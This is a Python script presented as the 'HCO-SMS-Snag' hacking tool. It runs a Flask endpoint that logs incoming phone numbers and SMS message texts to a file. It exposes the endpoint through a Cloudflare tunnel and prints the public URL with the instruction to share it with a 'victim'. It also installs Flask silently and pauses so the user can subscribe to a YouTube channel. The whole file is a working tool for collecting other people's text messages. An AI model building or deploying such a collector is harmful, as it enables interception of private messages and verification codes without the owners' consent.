import os
import time
import subprocess
from flask import Flask, request
from threading import Thread

app = Flask(__name__)
sms_file = "sms.txt"

def banner():
    os.system("clear")
    print("\033[1;33m")
    print("═" * 60)
    print(" " * 15 + "\033[1;31mHACKERS COLONY\033[0m")
    print(" " * 12 + "\033[1;32mHCO-SMS-Snag by Azhar\033[0m")
    print("═" * 60)
    print("\033[0m")

def youtube_redirect():
    print("\033[1;36mRedirecting to YouTube in 8 seconds...\033[0m")
    time.sleep(8)
    os.system("am start https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
    input("\n\033[1;33mPress ENTER after subscribing to continue...\033[0m")

@app.route('/sms', methods=['POST'])
def sms():
    number = request.form.get("number")
    message = request.form.get("message")
    log = f"From: {number} -> {message}\n"
    print(f"\033[1;35m[+] SMS Received: \033[0m{log.strip()}")
    with open(sms_file, "a") as f:
        f.write(log)
    return "Logged"

def start_flask(port):
    app.run(host="0.0.0.0", port=port)

def start_cloudflared(port):
    os.system(f"cloudflared tunnel --url http://127.0.0.1:{port} > .link.log 2>&1 &")
    time.sleep(5)
    with open(".link.log", "r") as f:
        lines = f.readlines()
        urls = [line.strip() for line in lines if "trycloudflare.com" in line]
        for url in urls:
            print(f"\033[1;32m[✓] Share this link with victim: {url}\033[0m")

def start_server():
    port = 5000
    while True:
        try:
            t1 = Thread(target=start_flask, args=(port,))
            t1.start()
            break
        except OSError:
            print(f"[!] Port {port} in use. Trying {port+1}...")
            port += 1

if __name__ == '__main__':
    banner()
    print("[•] Installing requirements...")
    os.system("pip install flask > /dev/null")
    youtube_redirect()
    print("[•] Starting Flask server...")
    thread = Thread(target=start_server)
    thread.start()
    time.sleep(2)
    print("[•] Starting Cloudflare tunnel...")
    start_cloudflared(5000)